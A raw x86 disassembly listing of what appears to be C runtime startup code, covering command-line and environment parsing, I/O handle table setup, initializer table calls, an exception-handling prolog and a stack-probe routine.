  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
